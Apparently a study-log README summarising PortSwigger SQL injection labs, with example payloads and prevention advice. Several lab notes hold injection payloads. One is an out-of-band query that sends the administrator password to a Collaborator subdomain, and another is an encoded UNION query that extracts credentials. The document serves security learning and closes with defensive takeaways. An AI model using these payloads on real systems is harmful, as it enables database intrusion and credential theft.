# 📓 Day 3: SQL Injection Basics + Labs

Today’s focus: mastering SQL Injection vulnerabilities using PortSwigger labs.

---

## 🔍 Topics Covered

✅ Understanding SQL Injection basics
✅ UNION-based SQL Injection
✅ Blind SQL Injection (Boolean, Time-based, Error-based)

---

## 🧪 Lab Walkthroughs

### Lab 1: UNION SQL Injection

- Identify column count using `ORDER BY`
- Find reflected columns using `UNION SELECT NULL, 'test'--`
- Extract sensitive data (`username`, `password`)
- Use `NULL` for non-displayed columns

### Lab 2: Blind SQL Injection (Boolean)

- Inject true/false conditions (`AND 1=1`, `AND 1=2`)
- Extract data character by character with `SUBSTRING`

### Lab 3: Blind SQL Injection (Time-based)

- Use `IF` + `SLEEP` conditions to test truth (`IF(1=1, SLEEP(5), 0)--`)
- Infer data by measuring response delays

### Lab 4: Blind SQL Injection (Error-based)

- Use `CASE WHEN` + divide-by-zero to trigger conditional errors
- Extract table names, column names, passwords using crafted payloads

### Lab 5: Out-of-Band (OAST) SQL Injection

- Trigger external DNS/HTTP interactions to leak data
- Use Burp Collaborator to capture the out-of-band callouts
- Craft payloads like:

```
TrackingId=x'||(SELECT password FROM users WHERE username='administrator')||'.your-collab-subdomain.burpcollaborator.net'--
```

- Poll Collaborator tab to retrieve leaked data

### Lab 6: SQL Injection in Different Contexts

- Inject via JSON, XML, or HTTP headers
- Bypass filters using encoding/escaping (e.g., XML entities)
- Example XML payload:

```
<storeId>1 &#x55;NION SELECT username || '-' || password FROM users</storeId>
```

### Lab 7: Second-Order SQL Injection

- Inject payloads that get stored in the DB first (e.g., in profile fields)
- Wait until app retrieves and uses that data in a later SQL query
- Example:
  1. Submit: `newbio=abc' UNION SELECT ...--`
  2. Trigger second request (e.g., profile view) that runs the malicious SQL

---

## 🛡️ Takeaways

- Parameterize all queries — never directly insert user input
- Use prepared statements in all backend code
- Avoid passing table/column names or ORDER BY fields from user input
- Apply whitelisting where dynamic elements are unavoidable
- Grant least privilege to database accounts — no unnecessary `INSERT`, `DELETE`, or `DROP`
- Regularly scan/test with tools like Burp Suite, sqlmap, and Snyk

---

## Steps to Prevent SQLi

1. Use parameterized queries/prepared statements.
2. Avoid dynamic query construction with user-controlled identifiers.
3. Sanitize and validate all inputs, including hidden fields and headers.
4. Apply principle of least privilege — e.g., app DB user only needs `SELECT`, not `DROP`.
5. Regularly patch frameworks and libraries to close known injection vulnerabilities.
6. Run code reviews and static analysis tools to catch unsafe patterns.

---

## 📎 Links

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [Day 3 GitHub Folder](./)

🌟 **Day 3 complete! On to Day 4...**
